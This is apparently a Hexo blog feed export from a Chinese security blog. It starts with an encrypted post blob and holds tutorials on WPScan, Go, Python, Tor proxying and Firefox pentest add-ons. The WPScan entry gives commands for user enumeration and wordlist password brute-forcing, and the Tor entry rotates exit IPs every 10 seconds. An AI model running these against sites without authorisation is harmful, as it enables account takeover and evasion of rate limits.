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]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[debian安装wpscan]]></title>
    <url>%2F2020%2F12%2F17%2F142_debian%E5%AE%89%E8%A3%85wpscan%2F</url>
    <content type="text"><![CDATA[debian安装wpscan 在Linux上安装和使用WPScan – WordPress漏洞扫描程序 WPScan是一个命令行WordPress漏洞扫描程序，可用于扫描WordPress漏洞。它预装在以下渗透测试Linux发行版中 QQ群：397745473 wpscan 安装命令12345sudo apt install rubysudo apt install build-essential libcurl4-openssl-dev libxml2 libxml2-dev libxslt1-dev ruby-dev libgmp-dev zlib1g-devsudo gem install wpscanwpscan --update 简单用法1234567wpscan --url www.vksec.com --enumerate p #扫描插件基本信息wpscan --url www.vksec.com --enumerate vp #扫描容易受攻击的插件wpscan --url www.vksec.com --enumerate ap #扫描所有插件wpscan --url www.vksec.com --enumerate u #扫描后台用户wpscan --url www.vksec.com --wordlist wordlist.lst --username root #通过用户名爆破密码wpscan --url [wordpress网址] --wordlist [字典文件] --username [要破解的用户] --threads [开启的线程数] 如果要使用枚举功能，请使用 -e 参数，该参数有如下选项： vp 枚举易受攻击的插件 ap 枚举所有插件 p 枚举热门插件 vt 枚举易受攻击的主题 at 枚举所有主题 t 枚举热门主题 tt 枚举缩略图 cb 枚举备份配置 dbe 导出数据库 u 枚举用户 ID，例如 u1-5 m 枚举媒体文件 ID，例如 m1-5 如果未对 -e 参数提供选项，默认值为：-e vp,vt,tt,cb,dbe,u,m 基本操作12COPYwpscan --update #更新漏洞库wpscan -h #查看帮助信息 站点扫描1COPYwpscan --url [wordpress url] #对wordpress站点扫描 枚举用户12COPYwpscan --url [wordpress url] --enumerate u #枚举用户列表，--enumerate可用-u代替wpscan --url [wordpress url] -P [path to wordlist] -U [username to brute force] #暴力破解指定用户名的密码，可加-t指定线程,--rua随机UA头 枚举主题123COPYwpscan --url [wordpress url] --enumerate t #扫描主题wpscan --url [wordpress url] --enumerate vt #扫描主题漏洞wpscan --url [wordpress url] --enumerate at #扫描所有主题 枚举插件123COPYwpscan --url [wordpress url] --enumerate p #扫描插件wpscan --url [wordpress url] --enumerate vp #扫描插件漏洞wpscan --url [wordpress url] --enumerate ap #扫描所有插件 常见用法展开目录 枚举所有用户 wpscan --url http://example.com -e u 1更多参考： https://xdym11235.com/archives/193.html QQ群：397745473]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[golang使用数据库]]></title>
    <url>%2F2020%2F12%2F15%2F141_golang%E4%BD%BF%E7%94%A8%E6%95%B0%E6%8D%AE%E5%BA%93%2F</url>
    <content type="text"><![CDATA[golang使用数据库 QQ群：397745473 golang使用sqlite数据库123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081import ( &quot;database/sql&quot; _ &quot;github.com/mattn/go-sqlite3&quot;)const ( DBFILENAME = &quot;./Magboo.db&quot;)db, err := sql.Open(&quot;sqlite3&quot;, DBFILENAME)checkErr(err)createDBSql := `CREATE TABLE if not exists MagbooUrl ( url TEXT PRIMARY KEY UNIQUE, ShellID TEXT(20), User TEXT(20), Price TEXT(20), UserInfo TEXT(20), Moz TEXT(20) );` _, err = db.Exec(createDBSql) checkErr(err)//// 插入数据 //stmt, err := db.Prepare(&quot;INSERT INTO userinfo(username, department, created) values(?,?,?)&quot;) //checkErr(err) // //res, err := stmt.Exec(&quot;astaxie&quot;, &quot;研发部门&quot;, &quot;2012-12-09&quot;) //checkErr(err) // //id, err := res.LastInsertId() //checkErr(err) // //fmt.Println(id) //// 更新数据 //stmt, err = db.Prepare(&quot;update userinfo set username=? where uid=?&quot;) //checkErr(err) // //res, err = stmt.Exec(&quot;astaxieupdate&quot;, id) //checkErr(err) // //affect, err := res.RowsAffected() //checkErr(err) // //fmt.Println(affect) // //// 查询数据 //rows, err := db.Query(&quot;SELECT * FROM userinfo&quot;) //checkErr(err) // //for rows.Next() &#123; // var uid int // var username string // var department string // var created time.Time // err = rows.Scan(&amp;uid, &amp;username, &amp;department, &amp;created) // checkErr(err) // fmt.Println(uid) // fmt.Println(username) // fmt.Println(department) // fmt.Println(created) //&#125; // //// 删除数据 //stmt, err = db.Prepare(&quot;delete from userinfo where uid=?&quot;) //checkErr(err) // //res, err = stmt.Exec(id) //checkErr(err) // //affect, err = res.RowsAffected() //checkErr(err) // //fmt.Println(affect) // //db.Close() // 参考： https://my.oschina.net/u/4417839/blog/3691049 QQ群：397745473]]></content>
      <categories>
        <category>golang</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>golang</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python常用代码片段]]></title>
    <url>%2F2020%2F12%2F10%2F140_python%E5%B8%B8%E7%94%A8%E4%BB%A3%E7%A0%81%E7%89%87%E6%AE%B5%2F</url>
    <content type="text"><![CDATA[python常用代码片段 QQ群：397745473 扫描指定文件夹下的文件扫描指定文件夹下的文件。或者匹配指定后缀和前缀的函数。假设要扫描指定文件夹下的文件，包含子文件夹，调用scan_files(“/export/home/test/“)假设要扫描指定文件夹下的特定后缀的文件（比方jar包），包含子文件夹，调用 scan_files(“/export/home/test/“, postfix=”.jar”) 123456789101112131415161718192021222324def scanDir(directory, prefix=None, postfix=None): &apos;&apos;&apos; 扫描指定文件夹下的文件。或者匹配指定后缀和前缀的函数。 假设要扫描指定文件夹下的文件，包含子文件夹，调用scan_files(&quot;/export/home/test/&quot;) 假设要扫描指定文件夹下的特定后缀的文件（比方jar包），包含子文件夹，调用scan_files(&quot;/export/home/test/&quot;, postfix=&quot;.jar&quot;) 假设要扫描指定文件夹下的特定前缀的文件（比方test_xxx.py）。包含子文件夹，调用scan_files(&quot;/export/home/test/&quot;, prefix=&quot;test_&quot;) :param directory: 指定需要扫描的目录 :param prefix: 包含前缀 :param postfix: 包含后缀 :return: 文件列表 &apos;&apos;&apos; files_list = [] for root, sub_dirs, files in os.walk(directory): for special_file in files: if postfix: if special_file.endswith(postfix): files_list.append(os.path.join(root, special_file)) elif prefix: if special_file.startswith(prefix): files_list.append(os.path.join(root, special_file)) else: files_list.append(os.path.join(root, special_file)) return files_list 建立目录12345678910111213141516171819202122232425262728def mkdir(path): &apos;&apos;&apos; 建立目录 :param path: 需要建立的目录 :return: 成功返回 True 失败返回 False &apos;&apos;&apos; # 去除首位空格 path = path.strip() # 去除尾部 \ 符号 path = path.rstrip(&quot;\\&quot;) # 判断路径是否存在 # 存在 True # 不存在 False isExists = os.path.exists(path) # 判断结果 if not isExists: # 如果不存在则创建目录 # 创建目录操作函数 os.makedirs(path) print(path + &apos; 创建成功&apos;) return True else: # 如果目录存在则不创建，并提示目录已存在 print(path + &apos; 目录已存在&apos;) return False QQ群：397745473]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[挖洞常用的一条命令的技巧]]></title>
    <url>%2F2020%2F12%2F09%2F139_%E6%8C%96%E6%B4%9E%E5%B8%B8%E7%94%A8%E7%9A%84%E4%B8%80%E6%9D%A1%E5%91%BD%E4%BB%A4%E7%9A%84%E6%8A%80%E5%B7%A7%2F</url>
    <content type="text"><![CDATA[请输入密码,有问题请加QQ群:397745473 Incorrect Password! No content to display! ]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[使用ZeroTier内穿透太容易了]]></title>
    <url>%2F2020%2F12%2F05%2F137_%E4%BD%BF%E7%94%A8ZeroTier%E5%86%85%E7%A9%BF%E9%80%8F%E5%A4%AA%E5%AE%B9%E6%98%93%E4%BA%86%2F</url>
    <content type="text"><![CDATA[使用ZeroTier内穿透太容易了 QQ群：397745473 使用ZeroTier内穿透太容易了 使用ZeroTier搭建P2P局域网12345678910官网： https://www.zerotier.com/官方Github：https://github.com/zerotier1. 到官网注册账号。2. 安装客户端并登陆。3. 建立局域网段。客户端下载地址：https://www.zerotier.com/download/ QQ群：397745473]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[golang编译不同平台可执行文件]]></title>
    <url>%2F2020%2F12%2F05%2F138_golang%E7%BC%96%E8%AF%91%E4%B8%8D%E5%90%8C%E5%B9%B3%E5%8F%B0%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6%2F</url>
    <content type="text"><![CDATA[golang编译不同平台可执行文件 QQ群：397745473 1、Mac下编译Linux, Windows平台的64位可执行程序： 12$ CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build test.go$ CGO_ENABLED=0 GOOS=windows GOARCH=amd64 go build test.go 2、Linux下编译Mac, Windows平台的64位可执行程序： 12$ CGO_ENABLED=0 GOOS=darwin GOARCH=amd64 go build test.go$ CGO_ENABLED=0 GOOS=windows GOARCH=amd64 go build test.go 3、Windows下编译Mac, Linux平台的64位可执行程序： 12$ SET CGO_ENABLED=0SET GOOS=darwin3 SET GOARCH=amd64 go build test.go$ SET CGO_ENABLED=0 SET GOOS=linux SET GOARCH=amd64 go build test.go 注：如果编译web等工程项目，直接cd到工程目录下直接执行以上命令GOOS：目标可执行程序运行操作系统，支持 darwin，freebsd，linux，windowsGOARCH：目标可执行程序操作系统构架，包括 386，amd64，armGolang version 1.5以前版本在首次交叉编译时还需要配置交叉编译环境：CGO_ENABLED=0 GOOS=linux GOARCH=amd64 ./make.bashCGO_ENABLED=0 GOOS=windows GOARCH=amd64 ./make.bash QQ群：397745473]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[多账号防关联使用方案]]></title>
    <url>%2F2020%2F12%2F05%2F145_%E5%A4%9A%E8%B4%A6%E5%8F%B7%E9%98%B2%E5%85%B3%E8%81%94%E4%BD%BF%E7%94%A8%E6%96%B9%E6%A1%88%2F</url>
    <content type="text"><![CDATA[请输入密码,有问题请加QQ群:397745473 Incorrect Password! No content to display! ]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python做http请求时常用代码记录]]></title>
    <url>%2F2020%2F12%2F01%2F136_Python%E5%81%9Ahttp%E8%AF%B7%E6%B1%82%E6%97%B6%E5%B8%B8%E7%94%A8%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95%2F</url>
    <content type="text"><![CDATA[Python做http请求时常用代码记录 QQ群：397745473 用python请求时使用代理案例1234def get_ip(): url='https://www.myexternalip.com/raw' get_ip= requests.get(url,proxies=dict(http='socks5://127.0.0.1:9050',https='socks5://127.0.0.1:9050')) return get_ip.text 1参考： https://cloud.tencent.com/developer/article/1531145 配置tor:12345678910111213sudo apt-get install tor生成密码: tor --hash-password mypassword这里会生成一串以 16 开头的 hash 串。sudo vim /etc/tor/torrc根据开头的介绍 Tor 在几分钟内会自动更换 IP 但是这个更换频率在爬虫应用中显然是不合适的，所以我们修改他的更换频率为 10 秒。# 指定端口ControlPort 9051# 填入密码HashedControlPassword [密码]# 设置更换ip的频率MaxCircuitDirtiness 10 python2依赖包安装1pip install requesockspip install requests 测试脚本123456789101112131415161718192021222324import osimport requestsimport requesocksimport timeurl = &apos;https://api.ipify.org?format=json&apos;def getip_requests(url): print &quot;(+) Sending request with plain requests...&quot; r = requests.get(url) print &quot;(+) IP is: &quot; + r.text.replace(&quot;\n&quot;, &quot;&quot;)def getip_requesocks(url): print &quot;(+) Sending request with requesocks...&quot; session = requesocks.session() session.proxies = &#123;&apos;http&apos;: &apos;socks5://127.0.0.1:9050&apos;, &apos;https&apos;: &apos;socks5://127.0.0.1:9050&apos;&#125; r = session.get(url) print &quot;(+) IP is: &quot; + r.text.replace(&quot;\n&quot;, &quot;&quot;)def main(): print &quot;Running tests...&quot; getip_requests(url) while True: getip_requesocks(url) time.sleep(10);if __name__ == &quot;__main__&quot;: main() Python3依赖包12pip3 install pysockspip3 install requests 测试脚本12345678910111213141516171819202122232425import requestsimport timeimport sysimport socketimport socksdef getip_requests(url): print(&quot;(+) Sending request with plain requests...&quot;) r = requests.get(url) print(&quot;(+) IP is: &quot; + r.text.replace(&quot;\n&quot;, &quot;&quot;))def main(): print(&quot;Running tests...&quot;) url = &apos;https://api.ipify.org?format=json&apos; socks.set_default_proxy(socks.SOCKS5, &quot;127.0.0.1&quot;, 9050) socket.socket = socks.socksocket while True: getip_requests(url) time.sleep(10);if __name__ == &apos;__main__&apos;: main() QQ群：397745473]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[34款firefox渗透测试辅助插件]]></title>
    <url>%2F2020%2F11%2F27%2F135_34%E6%AC%BEfirefox%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E8%BE%85%E5%8A%A9%E6%8F%92%E4%BB%B6%2F</url>
    <content type="text"><![CDATA[34款firefox渗透测试辅助插件 工欲善必先利其器，firefox一直是各位渗透师必备的利器，这里推荐34款firefox渗透测试辅助插件，其中包含渗透测试、信息收集、代理、加密解密等功能。 QQ群：397745473 1来源： http://www.soojoy.net/test/ 工欲善必先利其器，firefox一直是各位渗透师必备的利器，这里推荐34款firefox渗透测试辅助插件，其中包含渗透测试、信息收集、代理、加密解密等功能。 1：Firebug Firefox的 五星级强力推荐插件之一，不许要多解释 2：User Agent Switcher改变客户端的User Agent的一款插件 3：Hackbar攻城师必备工具，提供了SQL注入和XSS攻击，能够快速对字符串进行各种编码。 4：HttpFox监测和分析浏览器与web服务器之间的HTTP流量 5：Live HTTP Headers即时查看一个网站的HTTP头 6：Tamper Data查看和修改HTTP/HTTPS头和POST参数 7：ShowIP在状态栏显示当前页的IP地址、主机名、ISP、国家和城市等信息。 8：OSVDB开放源码的漏洞数据库检索 9:Packet Storm search pluginPacket Storm提供的插件，可以搜索漏洞、工具和exploits等。 10：Offsec Exploit-db Search搜索Exploit-db信息 11：Security Focus Vulnerabilities Search Plugin在Security Focus上搜索漏洞 12：Cookie Watcher在状态栏显示cookie 13:Header Spy在状态栏显示HTTP头 14：GroundspeedManipulate the application user interface. 15：CipherFox在状态栏显示当前SSL/TLS的加密算法和证书 16：XSS MeXSS测试扩展 17：SQL Inject MeSQL注入测试扩展 18：Wappalyzer查看网站使用的应用程序 19：Poster发送与Web服务器交互的HTTP请求，并查看输出结果 20：Javascript Deobfuscator显示网页上运行的Javascript代码 21：Modify Headers修改HTTP请求头 22：FoxyProxy代理工具 23：FlagFox可以在地址栏或状态栏上显示出当前网站所在国家的国旗，也有更多的其他功能，如：双击国旗可以实现WOT功能；鼠标中键点击是whois功能。当然用户可以在选项里设置快捷键实现诸如复制IP，维基百科查询等功能。 24：Greasemonkeygreasemonkey 使你可以向任何网页添加DHTML语句(用户脚本)来改变它们的显示方式。就像CSS可以让你接管网页的样式，而用户脚本(User Script)则可以让你轻易地控制网页设计与交互的任何方面。例如: * 使页面上显示的 URL 都成为可以直接点击进入的链接。 * 增强网页实用性，使你经常访问的网站更符合你的习惯。 * 绕过网站上经常出现的那些烦人的 Bug。 25：Domain Details显示服务器类型、IP地址、域名注册信息等 26：WebsecurifyWebsecurify是WEB安全检测软件的Firefox的扩展，可以针对Web应用进行安全评估 27：XSSed Search搜索XSSed.Com跨站脚本数据库 28：ViewStatePeeker查看asp.net的iewState 29：CryptoFox破解MD5、加密/解密工具 30：WorldIP显示服务器的IP、地址、PING、Traceroute、RDNS等信息 31：Server Spy识别访问的web服务器类型，版本以及IP地址的插件 32：Default Passwords搜索CIRT.net默认密码数据库。 33：Snort IDS Rule Search搜索Snort的IDS规则，做签名开发的应该很有用。 34：FireCATFireCAT (Firefox Catalog of Auditing exTensions)是一个收集最有效最有用的应用程序安全审计和风险评估工具的列表(这些工具以Firefox插件形式发布的),FireCAT中没 有收集的安全工具类型包括:fuzzer,代理和应用程序扫描器. QQ群：397745473]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[golang发送常见请求案例]]></title>
    <url>%2F2020%2F11%2F24%2F134_golang%E5%8F%91%E9%80%81%E5%B8%B8%E8%A7%81%E8%AF%B7%E6%B1%82%E6%A1%88%E4%BE%8B%2F</url>
